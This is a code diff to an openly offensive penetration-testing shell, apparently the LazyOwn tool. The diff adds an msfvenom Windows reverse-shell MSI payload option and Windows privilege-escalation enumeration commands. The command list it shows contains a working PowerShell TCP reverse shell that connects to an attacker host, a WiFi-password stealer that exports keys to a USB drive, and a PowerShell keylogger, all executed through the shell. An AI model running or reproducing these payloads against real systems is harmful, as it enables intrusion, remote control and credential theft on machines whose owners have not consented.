@@ -88,6 +88,7 @@ class LazyOwnShell(cmd2.Cmd):
         "hosts": "sh sudo nano /etc/hosts",
         "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
         "ls": "list",
+        "kvpn":"sh sudo killall openvpn",
         "nmap": "run lazynmap",
         "now": "clock",
         "notes": "sh nano sessions/notes.txt",
@@ -1751,7 +1752,8 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
         print_msg("18: windows/x64/exec cmd='net user administrator P@s5w0rd123!'")
         print_msg("19: windows/shell_reverse_tcp python shellcode")
-        choice = input("Enter your choice (1-19): ").strip()
+        print_msg("20: windows/x64/shell_reverse_tcp msi")
+        choice = input("Enter your choice (1-20): ").strip()
 
         # Define payload commands
         commands = {
@@ -1784,6 +1786,9 @@ class LazyOwnShell(cmd2.Cmd):
             ),
             "19": (
                 f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/run.py'
+            ),
+            "20": (
+                f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi'
             )
         }
 
@@ -1820,13 +1825,15 @@ class LazyOwnShell(cmd2.Cmd):
                     os.system("upx sessions/shell.elf")
                 if os.path.exists("sessions/shell64.elf"):
                     os.system("upx sessions/shell64.elf")
-            if choice in ["3", "4", "9", "10", "14"]:
+            if choice in ["3", "4", "9", "10", "14","20"]:
                 if os.path.exists("sessions/shell.exe"):
                     os.system("upx sessions/shell.exe")
                 if os.path.exists("sessions/shell64.exe"):
                     os.system("upx sessions/shell64.exe")
                 if os.path.exists("sessions/shell64_encoded.exe"):
                     os.system("upx sessions/shell64_encoded.exe")
+                if os.path.exists("sessions/shell64.ms"):
+                    os.system("upx sessions/shell64.ms")
             if choice in ["5", "6", "11", "12"]:
                 if os.path.exists("sessions/shell.macho"):
                     os.system("upx sessions/shell.macho")
@@ -3229,8 +3236,8 @@ class LazyOwnShell(cmd2.Cmd):
             if not url:
                 print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
                 return
-            print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} {RESET}")
-            os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
+            print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} --add-slash{RESET}")
+            os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist} --add-slash")
             return
         if line.startswith("vhost"):
             url = self.params["url"]
@@ -3245,9 +3252,9 @@ class LazyOwnShell(cmd2.Cmd):
             )
             return
         print_msg(
-            f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} {RESET}"
+            f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash{RESET}"
         )
-        os.system(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line}")
+        os.system(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash")
         return
 
     def do_addhosts(self, line):
@@ -5240,7 +5247,7 @@ class LazyOwnShell(cmd2.Cmd):
         )
         return
 
-    def do_find(self, line):
+    def do_find(self, line=""):
         """
         Automates command execution based on a list of aliases and commands.
 
@@ -5249,12 +5256,11 @@ class LazyOwnShell(cmd2.Cmd):
         3. If confirmed, displays the alias and command with a number.
         4. Executes the command and copies it to the clipboard.
 
-        :param line: The command line input containing the list of alias and command pairs.
+        :param line: The command line input containing a keyword to filter the list of alias and command pairs.
         :type line: str
         :returns: None
 
         Manual execution:
-        To manually run these tasks, you would need to:
         - Prepare the list of alias and command pairs in the format: "alias command".
         - Provide this list as input to the function.
         - Confirm the execution of the desired command when prompted.
@@ -5272,7 +5278,6 @@ class LazyOwnShell(cmd2.Cmd):
         ext = asub[1]
         if not check_lhost(lhost):
             return
-
         commands_list = [
             
             ("list file attributes on a Linux second extended file system", "lsattr -va"),
@@ -5329,9 +5334,10 @@ class LazyOwnShell(cmd2.Cmd):
             ("locate .mysql_history files", "locate '.mysql_history'"),
             ("locate .fetchmailrc files", "locate '.fetchmailrc'"),
             ("locate backup files", "locate backup"),
-            ("locate dump files", "locate dump"),
             ("locate priv iot files", "powershell -c \"$credential = import-clixml -path C:\\Data\\Users\\app\\iot-admin.xml;$credential.GetNetworkCredential().password\""),
             ("lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
+            ("WIN Enum App Lock Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
+            ("WIN Enum Installer Policy", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
             ("WIN Rrev Shell", '$sm=(New-Object Net.Sockets.TCPClient("{lhost}",{lport})).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'.replace('{lhost}',lhost).replace('{lport}',str(lport))),
             ("WIN WifiGrab", "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"),
             ("WIN Keylogger", "$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"),
@@ -5378,14 +5384,16 @@ class LazyOwnShell(cmd2.Cmd):
 
         ]
         
-        for idx, (alias, cmd) in enumerate(commands_list):
+        filtered_commands = [(alias, cmd) for alias, cmd in commands_list if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else commands_list
+
+        for idx, (alias, cmd) in enumerate(filtered_commands):
             if cmd: 
                 print_msg(f"{idx + 1}{RESET}. Alias:{YELLOW} {alias}{RESET}, Command:{GREEN} {cmd}")
 
         try:
             choice = int(input("    [!] Enter the number of the command you want to execute: ")) - 1
-            if 0 <= choice < len(commands_list):
-                selected_alias, selected_cmd = commands_list[choice]
+            if 0 <= choice < len(filtered_commands):
+                selected_alias, selected_cmd = filtered_commands[choice]
                 if selected_cmd: 
                     confirm = input(f"   [?] Do you want to execute the command: {selected_cmd}? (y/n): ").strip().lower()
                     
@@ -5393,7 +5401,6 @@ class LazyOwnShell(cmd2.Cmd):
                         print_warn(f"Executing command: {selected_cmd}")
                         subprocess.run(selected_cmd + " 2>/dev/null", shell=True)
                         
-                     
                         command_clipboard = subprocess.Popen(
                             ['xclip', '-selection', 'clipboard'],
                             stdin=subprocess.PIPE
@@ -5402,7 +5409,6 @@ class LazyOwnShell(cmd2.Cmd):
                         print_msg(f"Command copied to clipboard: {selected_cmd}")
                     else:
                         print_warn("Command execution cancelled.")
-                          
                         command_clipboard = subprocess.Popen(
                             ['xclip', '-selection', 'clipboard'],
                             stdin=subprocess.PIPE
@@ -5417,6 +5423,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("Invalid input. Please enter a number.")
         except Exception as e:
             print_error(f"An error occurred: {e}")
+        return
 
     def do_sh(self, line):
         """
